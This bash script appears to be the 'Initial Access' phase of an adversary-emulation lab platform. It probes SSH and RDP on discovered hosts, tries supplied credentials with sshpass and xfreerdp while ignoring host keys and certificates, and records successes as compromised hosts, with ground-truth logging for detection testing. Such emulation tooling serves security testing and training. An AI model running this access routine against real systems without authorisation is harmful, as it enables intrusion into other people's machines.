#!/usr/bin/env bash

set -u

# ============================================================
# Nordic Manufacturing A/S
# MrNobody Incident Platform
#
# Phase 03 - Initial Access
#
# Linux:
#   SSH discovery + credential validation
#
# Windows:
#   RDP discovery + credential validation
#
# IMPORTANT:
#   A host is stored only once in compromised-hosts.json.
#
#   RDP success => Windows
#
#   SSH success without RDP:
#       OS is determined from the authenticated SSH session.
#
#   SSH + RDP success:
#       Host is classified as Windows.
#       RDP becomes the primary access method.
#       SSH remains recorded as an authenticated service.
#
# Passwords are NEVER written to logs or state.
# ============================================================

# ============================================================
# MRNOBODY ATTACK METADATA
# ============================================================

# ATTACK_ID="03"
# ATTACK_NAME="Initial Access"
# ATTACK_ALIAS="access"
# ATTACK_STANDALONE="true"
# ATTACK_PARAMETERS="target,port,protocol,username,password"
# ATTACK_CAMPAIGN_STATE="discovered-hosts"

# MITRE_TACTIC="Initial Access"
# MITRE_TECHNIQUES="T1078"

# ============================================================
# PATHS / CONFIG
# ============================================================

BASE_DIR="/opt/nordic-attack"
CONFIG_FILE="$BASE_DIR/config/defaults.conf"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found:"
    echo "$CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"

mkdir -p \
    "$NORDIC_STATE_DIR" \
    "$NORDIC_LOG_DIR"


# ============================================================
# CAMPAIGN CONFIGURATION
# ============================================================

INCIDENT_ID="${NORDIC_INCIDENT_ID:-MRN-$(date +%Y%m%d-%H%M%S)}"

# Linux / SSH
SSH_USER="${NORDIC_SSH_USERNAME:-${NORDIC_SSH_USER:-${NORDIC_DEFAULT_SSH_USER:-ubuntu}}}"
SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-}"
SSH_PORT="${NORDIC_SSH_PORT:-${NORDIC_DEFAULT_SSH_PORT:-22}}"
SSH_TIMEOUT="${NORDIC_SSH_TIMEOUT:-5}"

# Windows / RDP
RDP_USER="${NORDIC_RDP_USERNAME:-${NORDIC_RDP_USER:-${NORDIC_DEFAULT_RDP_USER:-Administrator}}}"
RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-}"
RDP_PORT="${NORDIC_RDP_PORT:-${NORDIC_DEFAULT_RDP_PORT:-3389}}"
RDP_TIMEOUT="${NORDIC_RDP_TIMEOUT:-5}"

CONNECT_TIMEOUT="${NORDIC_CONNECT_TIMEOUT:-2}"

DISCOVERED_STATE="$NORDIC_DISCOVERED_STATE"
COMPROMISED_STATE="$NORDIC_COMPROMISED_STATE"

LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-03-access.log"

# ============================================================
# EXECUTION MODE
# ============================================================

RUN_MODE="${MRNOBODY_RUN_MODE:-campaign}"

MANUAL_TARGET="${MRNOBODY_TARGET:-}"
MANUAL_PORT="${MRNOBODY_PORT:-}"
MANUAL_PROTOCOL="${MRNOBODY_PROTOCOL:-}"
MANUAL_USERNAME="${MRNOBODY_USERNAME:-}"
MANUAL_PASSWORD="${MRNOBODY_PASSWORD:-}"

# ============================================================
# FUNCTIONS
# ============================================================

log() {
    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {
    local MESSAGE="$1"

    printf '%s INCIDENT=%s PHASE=03 %s\n' \
        "$(date --iso-8601=seconds)" \
        "$INCIDENT_ID" \
        "$MESSAGE" \
        >> "$NORDIC_GROUND_TRUTH_LOG"
}


valid_port() {
    local PORT="$1"

    [[ "$PORT" =~ ^[0-9]+$ ]] || return 1
    (( PORT >= 1 && PORT <= 65535 ))
}


tcp_open() {
    local HOST="$1"
    local PORT="$2"

    timeout "$CONNECT_TIMEOUT" \
        bash -c "echo >/dev/tcp/$HOST/$PORT" \
        >/dev/null 2>&1
}


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 timeout sshpass ssh; do

    if ! command -v "$CMD" >/dev/null 2>&1; then
        echo "[ERROR] Required command not found: $CMD"
        exit 1
    fi

done


# ============================================================
# RDP AUTHENTICATION TOOL
# ============================================================

RDP_CLIENT=""

if command -v xfreerdp3 >/dev/null 2>&1; then
    RDP_CLIENT="$(command -v xfreerdp3)"

elif command -v xfreerdp >/dev/null 2>&1; then
    RDP_CLIENT="$(command -v xfreerdp)"
fi


# ============================================================
# VALIDATION
# ============================================================

if [[ "$RUN_MODE" == "campaign" ]]; then

    if [[ ! -f "$DISCOVERED_STATE" ]]; then
        echo "[ERROR] Phase 01 inventory not found:"
        echo "$DISCOVERED_STATE"
        echo
        echo "Run Phase 01 first."
        exit 1
    fi

elif [[ "$RUN_MODE" == "standalone" ]]; then

    if [[ -z "$MANUAL_TARGET" ]]; then
        echo "[ERROR] Standalone mode requires --target"
        exit 1
    fi

else

    echo "[ERROR] Unknown run mode: $RUN_MODE"
    exit 1

fi


# ============================================================
# ACCESS CONFIGURATION / VALIDATION
# ============================================================

TEST_SSH=1
TEST_RDP=1

if [[ "$RUN_MODE" == "standalone" ]]; then

    case "${MANUAL_PROTOCOL,,}" in

        ssh)
            TEST_SSH=1
            TEST_RDP=0

            SSH_USER="${MANUAL_USERNAME:-$SSH_USER}"
            SSH_PASSWORD="${MANUAL_PASSWORD:-$SSH_PASSWORD}"
            SSH_PORT="${MANUAL_PORT:-$SSH_PORT}"
            ;;

        rdp)
            TEST_SSH=0
            TEST_RDP=1

            RDP_USER="${MANUAL_USERNAME:-$RDP_USER}"
            RDP_PASSWORD="${MANUAL_PASSWORD:-$RDP_PASSWORD}"
            RDP_PORT="${MANUAL_PORT:-$RDP_PORT}"
            ;;

        "")
            echo "[ERROR] Standalone mode requires --protocol ssh or rdp"
            exit 1
            ;;

        *)
            echo "[ERROR] Unsupported standalone protocol: $MANUAL_PROTOCOL"
            exit 1
            ;;

    esac

fi


if [[ "$TEST_SSH" -eq 1 ]]; then

    if [[ -z "$SSH_USER" ]]; then
        echo "[ERROR] Linux SSH username is missing."
        exit 1
    fi

    if [[ -z "$SSH_PASSWORD" ]]; then
        echo "[ERROR] Linux SSH password is missing."
        exit 1
    fi

    if ! valid_port "$SSH_PORT"; then
        echo "[ERROR] Invalid SSH port: $SSH_PORT"
        exit 1
    fi

fi


if [[ "$TEST_RDP" -eq 1 ]]; then

    if [[ -z "$RDP_USER" ]]; then
        echo "[ERROR] Windows RDP username is missing."
        exit 1
    fi

    if [[ -z "$RDP_PASSWORD" ]]; then
        echo "[ERROR] Windows RDP password is missing."
        exit 1
    fi

    if ! valid_port "$RDP_PORT"; then
        echo "[ERROR] Invalid RDP port: $RDP_PORT"
        exit 1
    fi

fi


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo " NORDIC MANUFACTURING"
echo " MrNobody Incident Platform"
echo " PHASE 03 - INITIAL ACCESS"
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"

log "[*] Linux / SSH:"
log "    Username: $SSH_USER"
log "    Port:     $SSH_PORT"

log "[*] Windows / RDP:"
log "    Username: $RDP_USER"
log "    Port:     $RDP_PORT"

# Passwords are deliberately NEVER logged.

if [[ -n "$RDP_CLIENT" ]]; then
    log "[*] RDP authentication client: $(basename "$RDP_CLIENT")"
else
    log "[!] FreeRDP client not installed."
    log "[!] RDP services will be discovered but authentication cannot be tested."
fi

echo


# ============================================================
# LOAD HOSTS
# ============================================================

HOSTS=()

if [[ "$RUN_MODE" == "campaign" ]]; then

    mapfile -t HOSTS < <(
        python3 - "$DISCOVERED_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], "r", encoding="utf-8") as f:
    data = json.load(f)

for host in data.get("hosts", []):
    ip = host.get("ip")

    if ip:
        print(ip)
PY
    )

    log "[*] Hosts supplied by Phase 01: ${#HOSTS[@]}"

else

    HOSTS=(
        "$MANUAL_TARGET"
    )

    log "[*] Standalone target: ${HOSTS[0]}"

fi

echo

# ============================================================
# TEMPORARY RESULTS
#
# One line per successful access method:
#
# IP|PLATFORM_HINT|ACCESS|PORT|USER|HOSTNAME|OS
#
# These records are merged by IP afterwards.
# ============================================================

TMP_RESULTS="$NORDIC_STATE_DIR/.compromised-hosts.tmp"

: > "$TMP_RESULTS"


SSH_FOUND=0
SSH_LOGIN_SUCCESS=0
SSH_LOGIN_FAILED=0

RDP_FOUND=0
RDP_LOGIN_SUCCESS=0
RDP_LOGIN_FAILED=0
RDP_LOGIN_SKIPPED=0


# ============================================================
# DISCOVERY + AUTHENTICATION
# ============================================================

for HOST in "${HOSTS[@]}"; do

    echo
    echo "------------------------------------------------------------"
    echo " Host: $HOST"
    echo "------------------------------------------------------------"
    echo


    # ========================================================
    # SSH
    # ========================================================

    if [[ "$TEST_SSH" -eq 1 ]] &&
        tcp_open "$HOST" "$SSH_PORT"; then

        SSH_FOUND=$(( SSH_FOUND + 1 ))

        log "[+] SSH candidate: $HOST:$SSH_PORT"

        ground_truth \
            "SSH_DISCOVERED ip=$HOST port=$SSH_PORT"


        SSH_OUTPUT="$(
            sshpass -p "$SSH_PASSWORD" \
            ssh \
                -p "$SSH_PORT" \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o ConnectTimeout="$SSH_TIMEOUT" \
                -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no \
                -o NumberOfPasswordPrompts=1 \
                "$SSH_USER@$HOST" \
                '
                    printf "NORDIC_ACCESS_OK\n"

                    OS_NAME="$(uname -s 2>/dev/null || true)"

                    if [[ -z "$OS_NAME" ]]; then
                        OS_NAME="$(cmd.exe /c ver 2>/dev/null | tr -d "\r" || true)"
                    fi

                    printf "%s\n" "$OS_NAME"

                    hostname 2>/dev/null || true
                ' \
                2>/dev/null
        )"

        SSH_RESULT=$?


        if [[ $SSH_RESULT -eq 0 ]] &&
           grep -q '^NORDIC_ACCESS_OK$' <<< "$SSH_OUTPUT"; then

            SSH_LOGIN_SUCCESS=$(( SSH_LOGIN_SUCCESS + 1 ))

            OS="$(
                printf '%s\n' "$SSH_OUTPUT" |
                sed -n '2p'
            )"

            HOSTNAME="$(
                printf '%s\n' "$SSH_OUTPUT" |
                sed -n '3p'
            )"


            PLATFORM_HINT="unknown"

            if grep -Eqi \
                'windows|microsoft' \
                <<< "$OS"; then

                PLATFORM_HINT="windows"

            elif grep -Eqi \
                'linux|darwin|freebsd|openbsd|netbsd' \
                <<< "$OS"; then

                PLATFORM_HINT="linux"
            fi


            log "[AUTHENTICATED][SSH] $HOST"

            if [[ -n "$HOSTNAME" ]]; then
                log "                     Hostname: $HOSTNAME"
            fi

            if [[ -n "$OS" ]]; then
                log "                     OS:       $OS"
            fi

            log "                     Hint:     $PLATFORM_HINT"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "$PLATFORM_HINT" \
                "ssh" \
                "$SSH_PORT" \
                "$SSH_USER" \
                "$HOSTNAME" \
                "$OS" \
                >> "$TMP_RESULTS"


            ground_truth \
                "ACCESS_SUCCESS platform_hint=$PLATFORM_HINT access=ssh ip=$HOST port=$SSH_PORT user=$SSH_USER hostname=$HOSTNAME os=$OS"

        else

            SSH_LOGIN_FAILED=$(( SSH_LOGIN_FAILED + 1 ))

            log "[FAILED][SSH] Authentication failed: $HOST"

            ground_truth \
                "ACCESS_FAILED access=ssh ip=$HOST port=$SSH_PORT user=$SSH_USER"

        fi

    elif [[ "$TEST_SSH" -eq 1 ]]; then

    log "[-] SSH port closed/unreachable: $HOST:$SSH_PORT"

    fi

    # ========================================================
    # WINDOWS / RDP
    # ========================================================

    if [[ "$TEST_RDP" -eq 1 ]] &&
        tcp_open "$HOST" "$RDP_PORT"; then

        RDP_FOUND=$(( RDP_FOUND + 1 ))

        log "[+] RDP candidate: $HOST:$RDP_PORT"

        ground_truth \
            "RDP_DISCOVERED ip=$HOST port=$RDP_PORT"


        if [[ -z "$RDP_CLIENT" ]]; then

            RDP_LOGIN_SKIPPED=$(( RDP_LOGIN_SKIPPED + 1 ))

            log "[SKIPPED][RDP] Authentication client unavailable: $HOST"

            ground_truth \
                "RDP_AUTH_SKIPPED ip=$HOST port=$RDP_PORT reason=client_unavailable"

            continue
        fi


        RDP_OUTPUT="$(
            timeout "$RDP_TIMEOUT" \
                "$RDP_CLIENT" \
                    /v:"$HOST:$RDP_PORT" \
                    /u:"$RDP_USER" \
                    /p:"$RDP_PASSWORD" \
                    /auth-only \
                    /cert:ignore \
                    /log-level:ERROR \
                    2>&1
        )"

        RDP_RESULT=$?


        if [[ $RDP_RESULT -eq 0 ]] &&
           ! grep -Eqi \
                'ERRCONNECT_LOGON_FAILURE|STATUS_LOGON_FAILURE|authentication failure|logon failure' \
                <<< "$RDP_OUTPUT"; then

            RDP_LOGIN_SUCCESS=$(( RDP_LOGIN_SUCCESS + 1 ))

            log "[AUTHENTICATED][RDP] $HOST"
            log "                     User: $RDP_USER"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "windows" \
                "rdp" \
                "$RDP_PORT" \
                "$RDP_USER" \
                "" \
                "Windows" \
                >> "$TMP_RESULTS"


            ground_truth \
                "ACCESS_SUCCESS platform=windows access=rdp ip=$HOST port=$RDP_PORT user=$RDP_USER"

        else

            RDP_LOGIN_FAILED=$(( RDP_LOGIN_FAILED + 1 ))

            log "[FAILED][RDP] Authentication failed: $HOST"

            ground_truth \
                "ACCESS_FAILED platform=windows access=rdp ip=$HOST port=$RDP_PORT user=$RDP_USER"

        fi

    elif [[ "$TEST_RDP" -eq 1 ]]; then

    log "[-] RDP port closed/unreachable: $HOST:$RDP_PORT"

    fi

done


# ============================================================
# CREATE compromised-hosts.json
#
# IMPORTANT:
#
# Merge all successful access methods by IP.
#
# Priority:
#
#   RDP success
#       => Windows
#
#   Otherwise SSH OS hint
#       => Linux / Windows / unknown
#
# Primary access:
#
#   Windows + RDP => RDP
#   Otherwise SSH
#
# ============================================================

python3 - \
    "$TMP_RESULTS" \
    "$COMPROMISED_STATE" \
    "$INCIDENT_ID" <<'PY'

import json
import sys
from datetime import datetime, timezone


source_file = sys.argv[1]
output_file = sys.argv[2]
incident_id = sys.argv[3]


merged = {}


with open(source_file, "r", encoding="utf-8") as f:

    for line in f:

        line = line.rstrip("\n")

        if not line:
            continue

        (
            ip,
            platform_hint,
            access,
            port,
            user,
            hostname,
            os_name,
        ) = line.split("|", 6)


        host = merged.setdefault(
            ip,
            {
                "ip": ip,
                "authenticated": True,
                "compromised": True,
                "hostname": "",
                "os": "",
                "access_methods": {},
            },
        )


        if hostname and not host["hostname"]:
            host["hostname"] = hostname

        if os_name and not host["os"]:
            host["os"] = os_name


        host["access_methods"][access] = {
            "authenticated": True,
            "port": int(port),
            "user": user,
        }


        if access == "ssh":

            host["ssh_port"] = int(port)
            host["ssh_user"] = user
            host["ssh_username"] = user

            if platform_hint != "unknown":
                host["ssh_platform_hint"] = platform_hint


        elif access == "rdp":

            host["rdp_port"] = int(port)
            host["rdp_user"] = user
            host["rdp_username"] = user


# ------------------------------------------------------------
# Final classification
# ------------------------------------------------------------

hosts = []


for ip, host in merged.items():

    methods = host.get(
        "access_methods",
        {},
    )

    has_ssh = "ssh" in methods
    has_rdp = "rdp" in methods


    # RDP authentication is authoritative for Windows.
    if has_rdp:

        host["platform"] = "windows"
        host["os"] = "Windows"

        host["access"] = "rdp"

        host["primary_access"] = "rdp"


    elif has_ssh:

        hint = host.get(
            "ssh_platform_hint",
            "unknown",
        )

        if hint == "windows":
            host["platform"] = "windows"
            host["os"] = host.get("os") or "Windows"

        elif hint == "linux":
            host["platform"] = "linux"

        else:
            # Backwards-compatible fallback.
            #
            # An authenticated SSH service without a Windows
            # indicator remains a Linux source for the current
            # lab architecture.
            host["platform"] = "linux"

        host["access"] = "ssh"
        host["primary_access"] = "ssh"


    else:
        continue


    hosts.append(host)


hosts.sort(
    key=lambda item: tuple(
        int(part)
        for part in item["ip"].split(".")
    )
)


data = {
    "incident_id": incident_id,
    "generated": datetime.now(
        timezone.utc
    ).isoformat(),
    "count": len(hosts),
    "hosts": hosts,
}


with open(output_file, "w", encoding="utf-8") as f:
    json.dump(
        data,
        f,
        indent=2,
    )

PY


rm -f "$TMP_RESULTS"


# ============================================================
# UPDATE CENTRAL INVENTORY
# ============================================================

if [[ -f "$DISCOVERED_STATE" ]]; then

    python3 - \
        "$DISCOVERED_STATE" \
        "$COMPROMISED_STATE" <<'PY'
import json
import sys


inventory_file = sys.argv[1]
compromised_file = sys.argv[2]


with open(inventory_file, "r", encoding="utf-8") as f:
    inventory = json.load(f)


with open(compromised_file, "r", encoding="utf-8") as f:
    compromised = json.load(f)


compromised_by_ip = {
    host["ip"]: host
    for host in compromised.get("hosts", [])
}


for host in inventory.get("hosts", []):

    ip = host.get("ip")

    services = host.setdefault(
        "services",
        {},
    )


    if ip not in compromised_by_ip:

        host.setdefault(
            "compromised",
            False,
        )

        continue


    result = compromised_by_ip[ip]


    host["compromised"] = True
    host["status"] = "compromised"
    host["platform"] = result.get(
        "platform",
        "",
    )
    host["access"] = result.get(
        "access",
        "",
    )

    host["access_methods"] = result.get(
        "access_methods",
        {},
    )


    if "ssh" in result.get("access_methods", {}):

        ssh = result["access_methods"]["ssh"]

        host["ssh_candidate"] = True

        services["ssh"] = {
            "port": ssh.get("port"),
            "authenticated": True,
            "user": ssh.get("user", ""),
        }


    if "rdp" in result.get("access_methods", {}):

        rdp = result["access_methods"]["rdp"]

        host["rdp_candidate"] = True

        services["rdp"] = {
            "port": rdp.get("port"),
            "authenticated": True,
            "user": rdp.get("user", ""),
        }


    if result.get("hostname"):
        host["hostname"] = result["hostname"]


    if result.get("os"):
        host["os"] = result["os"]


with open(inventory_file, "w", encoding="utf-8") as f:

    json.dump(
        inventory,
        f,
        indent=2,
    )

PY

else

    log "[INFO] No discovered-hosts inventory to update."

fi

# ============================================================
# FINAL COMPROMISED INVENTORY
# ============================================================

mapfile -t FINAL_HOSTS < <(

    python3 - "$COMPROMISED_STATE" <<'PY'

import json
import sys


with open(sys.argv[1], "r", encoding="utf-8") as f:
    data = json.load(f)


for host in data.get("hosts", []):

    ip = host.get(
        "ip",
        "",
    )

    platform = host.get(
        "platform",
        "unknown",
    )

    primary = host.get(
        "primary_access",
        host.get(
            "access",
            "unknown",
        ),
    )

    methods = ",".join(
        sorted(
            host.get(
                "access_methods",
                {},
            ).keys()
        )
    )

    print(
        f"{ip}|{platform}|{primary}|{methods}"
    )

PY

)


echo
echo "============================================================"
echo " COMPROMISED HOST CLASSIFICATION"
echo "============================================================"
echo


for RECORD in "${FINAL_HOSTS[@]}"; do

    IFS='|' read -r \
        IP \
        PLATFORM \
        PRIMARY \
        METHODS \
        <<< "$RECORD"

    echo "[COMPROMISED][${PLATFORM^^}] $IP"
    echo "                       Primary access: $PRIMARY"
    echo "                       Access methods: $METHODS"
    echo

done


# ============================================================
# SUMMARY
# ============================================================

TOTAL_COMPROMISED="$(
    python3 - "$COMPROMISED_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], "r", encoding="utf-8") as f:
    data = json.load(f)

print(
    len(
        data.get(
            "hosts",
            [],
        )
    )
)
PY
)"


echo
echo "============================================================"
echo " PHASE 03 COMPLETED"
echo "============================================================"
echo

echo "Discovered hosts checked:"
echo "  ${#HOSTS[@]}"
echo

echo "Linux / SSH"
echo "-----------"

echo "SSH services found:"
echo "  $SSH_FOUND"
echo

echo "Successful SSH access:"
echo "  $SSH_LOGIN_SUCCESS"
echo

echo "Failed SSH authentication:"
echo "  $SSH_LOGIN_FAILED"
echo

echo "Windows / RDP"
echo "-------------"

echo "RDP services found:"
echo "  $RDP_FOUND"
echo

echo "Successful RDP access:"
echo "  $RDP_LOGIN_SUCCESS"
echo

echo "Failed RDP authentication:"
echo "  $RDP_LOGIN_FAILED"
echo

echo "RDP authentication skipped:"
echo "  $RDP_LOGIN_SKIPPED"
echo

echo "Unique compromised hosts:"
echo "  $TOTAL_COMPROMISED"
echo

echo "Compromised host inventory:"
echo "  $COMPROMISED_STATE"
echo

echo "Log:"
echo "  $LOG_FILE"
echo


ground_truth \
    "PHASE_COMPLETE ssh_found=$SSH_FOUND ssh_authenticated=$SSH_LOGIN_SUCCESS ssh_failed=$SSH_LOGIN_FAILED rdp_found=$RDP_FOUND rdp_authenticated=$RDP_LOGIN_SUCCESS rdp_failed=$RDP_LOGIN_FAILED rdp_skipped=$RDP_LOGIN_SKIPPED unique_compromised=$TOTAL_COMPROMISED"


exit 0